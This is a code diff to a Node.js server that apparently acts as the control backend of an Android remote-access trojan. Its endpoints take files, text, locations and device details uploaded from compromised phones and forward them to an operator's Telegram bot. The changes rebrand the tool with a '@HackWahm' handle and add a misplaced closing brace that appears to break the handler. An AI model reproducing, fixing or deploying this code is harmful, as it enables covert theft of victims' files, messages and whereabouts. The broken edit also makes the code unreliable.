@@ -24,14 +24,23 @@ let currentUuid = ''
 let currentNumber = ''
 let currentTitle = ''
 
+// دالة لتنظيف واستبدال أي يوزر قديم فوراً
+function cleanText(text) {
+    if (!text) return "";
+    return text.replace(/@shivayadavv/g, '@HackWahm');
+}
+
 app.get('/', function (req, res) {
     res.send('<h1 align="center">تم تشغيل البوت بنجاح بواسطة Wahm Empire | @HackWahm</h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
+    let captionText = `°• رسالة من <b>${req.headers.model}</b> جهاز`;
+    captionText = cleanText(captionText);
+
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
+            caption: captionText,
             parse_mode: "HTML"
         },
         {
@@ -40,15 +49,25 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
         })
     res.send('')
 })
+
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
+    let textContent = `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body['text'];
+    textContent = cleanText(textContent);
+
+    appBot.sendMessage(id, textContent, {parse_mode: "HTML"})
     res.send('')
 })
+
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
+    
+    let locText = `°• موقع من <b>${req.headers.model}</b> جهاز`;
+    locText = cleanText(locText);
+
+    appBot.sendMessage(id, locText, {parse_mode: "HTML"})
     res.send('')
 })
+
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
     const model = req.headers.model
@@ -65,6 +84,8 @@ appSocket.on('connection', (ws, req) => {
         brightness: brightness,
         provider: provider
     })
+})
+
     appBot.sendMessage(id,
         `°• جهاز جديد متصل\n\n` +
         `• موديل الجهاز : <b>${model}</b>\n` +
